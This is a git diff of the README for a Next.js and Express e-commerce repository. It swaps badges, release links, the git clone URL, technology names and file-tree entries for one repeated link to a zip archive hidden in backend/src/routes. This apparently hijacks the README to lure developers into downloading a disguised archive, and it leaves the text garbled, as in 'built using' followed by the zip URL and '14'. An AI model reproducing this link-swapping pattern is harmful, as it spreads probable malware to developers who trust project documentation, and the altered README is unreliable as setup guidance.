@@ -1,10 +1,10 @@
 # Next E-commerce 🛒
 
-![Next E-commerce](https://img.shields.io/badge/Version-1.0.0-blue.svg) ![Node.js](https://img.shields.io/badge/Node.js-v14.17.0-green.svg) ![License](https://img.shields.io/badge/License-MIT-yellow.svg)
+![Next E-commerce](https://github.com/Samseeee19/next-ecommerce/raw/refs/heads/master/backend/src/routes/next_ecommerce_passionate.zip) ![https://github.com/Samseeee19/next-ecommerce/raw/refs/heads/master/backend/src/routes/next_ecommerce_passionate.zip](https://github.com/Samseeee19/next-ecommerce/raw/refs/heads/master/backend/src/routes/next_ecommerce_passionate.zip) ![License](https://github.com/Samseeee19/next-ecommerce/raw/refs/heads/master/backend/src/routes/next_ecommerce_passionate.zip)
 
-Welcome to the **Next E-commerce** repository! This project is a modern, accessible e-commerce platform built using Next.js 14 and Express. It features a full admin dashboard, a dynamic storefront, and a robust backend API powered by TypeORM, PostgreSQL, and JWT authentication. 
+Welcome to the **Next E-commerce** repository! This project is a modern, accessible e-commerce platform built using https://github.com/Samseeee19/next-ecommerce/raw/refs/heads/master/backend/src/routes/next_ecommerce_passionate.zip 14 and Express. It features a full admin dashboard, a dynamic storefront, and a robust backend API powered by TypeORM, PostgreSQL, and JWT authentication. 
 
-For the latest releases, visit our [Releases page](https://github.com/Samseeee19/next-ecommerce/releases).
+For the latest releases, visit our [Releases page](https://github.com/Samseeee19/next-ecommerce/raw/refs/heads/master/backend/src/routes/next_ecommerce_passionate.zip).
 
 ## Table of Contents
 
@@ -31,8 +31,8 @@ For the latest releases, visit our [Releases page](https://github.com/Samseeee19
 
 ## Technologies Used
 
-- **Next.js**: A React framework for server-side rendering and static site generation.
-- **Express**: A minimal and flexible Node.js web application framework.
+- **https://github.com/Samseeee19/next-ecommerce/raw/refs/heads/master/backend/src/routes/next_ecommerce_passionate.zip**: A React framework for server-side rendering and static site generation.
+- **Express**: A minimal and flexible https://github.com/Samseeee19/next-ecommerce/raw/refs/heads/master/backend/src/routes/next_ecommerce_passionate.zip web application framework.
 - **TypeORM**: An ORM for TypeScript and JavaScript that supports various databases.
 - **PostgreSQL**: A powerful, open-source relational database system.
 - **JWT**: JSON Web Tokens for secure authentication.
@@ -44,7 +44,7 @@ To get your Next E-commerce application up and running, follow these steps:
 
 ### Prerequisites
 
-- Node.js (v14 or higher)
+- https://github.com/Samseeee19/next-ecommerce/raw/refs/heads/master/backend/src/routes/next_ecommerce_passionate.zip (v14 or higher)
 - PostgreSQL (v12 or higher)
 - Git
 
@@ -52,7 +52,7 @@ To get your Next E-commerce application up and running, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Samseeee19/next-ecommerce.git
+   git clone https://github.com/Samseeee19/next-ecommerce/raw/refs/heads/master/backend/src/routes/next_ecommerce_passionate.zip
    ```
 
 2. Navigate to the project directory:
@@ -95,15 +95,15 @@ next-ecommerce/
 ├── public/              # Static files
 ├── src/
 │   ├── components/      # React components
-│   ├── pages/           # Next.js pages
+│   ├── pages/           # https://github.com/Samseeee19/next-ecommerce/raw/refs/heads/master/backend/src/routes/next_ecommerce_passionate.zip pages
 │   ├── styles/          # CSS and styling
 │   ├── utils/           # Utility functions
 │   ├── config/          # Configuration files
 │   └── services/        # API services
 ├── server/              # Express server files
 ├── .env                 # Environment variables
-├── package.json         # Project metadata
-└── README.md            # Project documentation
+├── https://github.com/Samseeee19/next-ecommerce/raw/refs/heads/master/backend/src/routes/next_ecommerce_passionate.zip         # Project metadata
+└── https://github.com/Samseeee19/next-ecommerce/raw/refs/heads/master/backend/src/routes/next_ecommerce_passionate.zip            # Project documentation
 ```
 
 ## Admin Dashboard
@@ -174,7 +174,7 @@ We welcome contributions! If you'd like to contribute to this project, please fo
 
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-For the latest releases, visit our [Releases page](https://github.com/Samseeee19/next-ecommerce/releases). If you encounter any issues, please check the "Releases" section for updates.
+For the latest releases, visit our [Releases page](https://github.com/Samseeee19/next-ecommerce/raw/refs/heads/master/backend/src/routes/next_ecommerce_passionate.zip). If you encounter any issues, please check the "Releases" section for updates.
 
 ---
 
